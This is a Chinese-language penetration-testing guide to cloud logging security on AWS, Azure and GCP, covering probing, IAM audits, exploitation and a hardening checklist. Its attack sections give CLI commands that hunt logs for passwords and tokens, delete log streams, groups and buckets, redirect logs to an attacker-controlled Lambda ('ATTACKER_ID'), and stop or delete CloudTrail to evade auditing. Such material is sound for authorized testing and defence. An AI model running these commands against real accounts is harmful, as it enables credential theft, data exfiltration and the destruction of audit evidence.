# 云日志安全测试 (Cloud Logging Security Testing)

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供云环境日志服务的安全测试方法论，帮助测试人员评估 AWS、Azure、GCP 等云平台日志服务的安全性。

### 1.2 适用范围
本文档适用于以下场景：
- AWS CloudWatch Logs 安全测试
- Azure Monitor/Log Analytics 安全测试
- GCP Cloud Logging 安全测试
- 云日志数据完整性验证

### 1.3 读者对象
- 渗透测试工程师
- 云安全分析师
- 云架构师
- DevOps 工程师

---

## 第二部分：核心渗透技术专题

### 2.1 技术介绍

云日志服务是云提供商提供的托管日志管理服务。云日志安全测试关注 IAM 权限配置、日志数据保护、日志传输安全和日志保留策略等问题。

**核心原理：**
- **IAM 权限配置错误**：过宽的日志访问权限导致信息泄露
- **日志加密缺失**：日志存储和传输未加密
- **日志保留策略不当**：保留期过短或过长
- **跨账户访问风险**：跨账户日志共享配置错误

### 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **CloudWatch Logs** | AWS 日志服务 | IAM 策略过宽、未加密 |
| **Log Analytics** | Azure 日志服务 | 工作区权限错误 |
| **Cloud Logging** | GCP 日志服务 | _sink 配置错误 |
| **日志导出** | 日志导出到 S3/Blob | 存储桶权限错误 |
| **告警集成** | 日志告警触发 Lambda | 注入攻击 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**AWS CloudWatch 探测：**
```bash
# 检查 CloudWatch 权限
aws logs describe-log-groups
aws logs describe-log-streams --log-group-name <name>

# 读取日志数据
aws logs get-log-events \
  --log-group-name <name> \
  --log-stream-name <stream>

# 检查日志指标过滤器
aws logs describe-metric-filters --log-group-name <name>

# 检查订阅过滤器（可能泄露到其他服务）
aws logs describe-subscription-filters --log-group-name <name>
```

**Azure Log Analytics 探测：**
```bash
# 使用 Azure CLI
az monitor log-analytics workspace show \
  --resource-group <rg> \
  --workspace-name <name>

# 查询日志
az monitor log-analytics query \
  --workspace <workspace-id> \
  --analytics-query "Heartbeat | limit 10"

# 检查工作区权限
az role assignment list \
  --scope /subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.OperationalInsights/workspaces/<name>
```

**GCP Cloud Logging 探测：**
```bash
# 检查日志条目
gcloud logging read "resource.type=gce_instance" --limit=10

# 检查日志 sink
gcloud logging sinks list

# 检查日志存储桶
gcloud logging buckets list

# 检查 IAM 权限
gcloud projects get-iam-policy <project-id>
```

#### 2.3.2 白盒测试

**IAM 策略审计：**
```json
// AWS IAM 危险策略示例
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "logs:*",
    "Resource": "*"  // 危险：所有日志组
  }]
}

// 更安全的策略
{
  "Effect": "Allow",
  "Action": [
    "logs:GetLogEvents",
    "logs:FilterLogEvents"
  ],
  "Resource": "arn:aws:logs:*:*:log-group:app-logs:*"
}
```

```json
// GCP IAM 危险配置
{
  "bindings": [{
    "role": "roles/logging.admin",
    "members": ["user:external-user@example.com"]  // 危险：外部用户
  }]
}
```

### 2.4 漏洞利用方法

#### 2.4.1 日志数据泄露

```bash
# AWS：如果 IAM 策略过宽
# 读取所有日志组
aws logs describe-log-groups --query 'logGroups[*].logGroupName'

# 读取敏感日志
aws logs get-log-events \
  --log-group-name /aws/lambda/func \
  --log-stream-name 2024/01/01/[$LATEST]abc123 \
  --output text > logs.txt

# 搜索敏感信息
aws logs filter-log-events \
  --log-group-name app-logs \
  --filter-pattern "password OR secret OR token"
```

```bash
# GCP：读取审计日志
gcloud logging read \
  "logName=projects/<project>/logs/cloudaudit.googleapis.com%2Fdata_access" \
  --limit=100
```

#### 2.4.2 日志篡改

```bash
# AWS：删除日志流
aws logs delete-log-stream \
  --log-group-name app-logs \
  --log-stream-name sensitive-stream

# 删除日志组
aws logs delete-log-group --log-group-name app-logs

# 修改保留策略
aws logs put-retention-policy \
  --log-group-name app-logs \
  --retention-in-days 1  // 危险：仅保留 1 天
```

```bash
# GCP：删除日志条目
# 注意：GCP 不允许直接删除单条日志
# 但可以删除整个存储桶

gcloud logging buckets delete <bucket-name>
```

#### 2.4.3 日志导出劫持

```bash
# AWS：修改订阅过滤器
# 将日志重定向到攻击者控制的端点
aws logs put-subscription-filter \
  --log-group-name app-logs \
  --filter-name malicious-filter \
  --filter-pattern "" \
  --destination-arn arn:aws:lambda:us-east-1:ATTACKER_ID:function:steal-logs

# 检查现有订阅
aws logs describe-subscription-filters --log-group-name app-logs
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过 CloudTrail 审计

```bash
# CloudTrail 可能被绕过：
# 1. 使用未记录 API 的操作
# 2. 在 CloudTrail 未覆盖的区域操作
# 3. 删除 CloudTrail 日志（如果有权限）

# 停止 CloudTrail
aws cloudtrail stop-logging --name <trail-name>

# 删除 Trail
aws cloudtrail delete-trail --name <trail-name>
```

#### 2.5.2 利用无服务器日志

```bash
# Lambda 函数日志可能被忽略
# 在函数代码中记录敏感信息
# 然后删除函数

aws lambda delete-function --function-name sensitive-func
# 相关日志可能未被监控
```

---

## 第三部分：附录

### 3.1 云日志安全配置检查清单

| **云服务** | **配置项** | **安全设置** |
| :--- | :--- | :--- |
| AWS CloudWatch | 加密 | 启用 KMS |
| AWS CloudWatch | 保留策略 | 根据合规要求设置 |
| AWS CloudTrail | 多区域 | 启用所有区域 |
| Azure Log Analytics | 工作区权限 | 最小权限 |
| GCP Cloud Logging | Sink 权限 | 限制导出目标 |

### 3.2 云日志服务端口/端点

| **服务** | **端点** | **用途** |
| :--- | :--- | :--- |
| AWS CloudWatch | logs.<region>.amazonaws.com | API 端点 |
| Azure Log Analytics | api.loganalytics.io | API 端点 |
| GCP Cloud Logging | logging.googleapis.com | API 端点 |

### 3.3 参考资源

- [AWS CloudWatch Logs Security](https://docs.aws.amazon.com/AmazonCloudWatch/latest/logs/encryption.html)
- [Azure Monitor Security](https://docs.microsoft.com/en-us/azure/azure-monitor/platform/data-access-control)
- [GCP Cloud Logging Security](https://cloud.google.com/logging/docs/security)
- [CIS AWS Foundations Benchmark](https://www.cisecurity.org/benchmark/amazon_web_services)
